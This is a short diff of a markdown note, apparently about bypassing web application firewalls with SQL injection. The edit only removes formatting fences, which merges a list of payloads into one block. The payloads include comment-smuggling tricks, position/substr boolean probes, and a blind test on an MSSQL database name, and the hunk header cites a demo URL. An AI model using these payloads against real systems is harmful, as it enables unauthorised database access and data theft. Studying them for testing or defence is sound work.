@@ -108,53 +108,13 @@ http://sqli.aliyundemo.com/query?type=psql&id=/*’or+’0′!=position(substr((
 
 ```
 FIELD(if(1=1,1,3)1,3)
-```
-
-
-
-```
 select a from {a+%0dinformation_schema%23%0a.%0acolumns}
-```
-
-
-
-```
 "=feld(if(substr((/*/
-```
-
-
-
-```
 '0'!=position(substr('abc',1,1) in 'a')
-```
-
-
-
-```
 &id=/*'or+'0'!=position(substr((/*a*/select
-```
-
-
-
-```
 /*'or+'0'!=position(substr((/*a*/被注释
-```
-
-
-
-```
 123'AND 1=len('/*')/(seleCT -- */name from master..sysdatabases for xml path) --
-```
-
-
-
-```
 22329-len('/*')/@@version
-```
-
-
-
-```
 2-len('/*')/(case when substring(db_name(),1,1)='x' then 0 else 1 end)
 ```
 
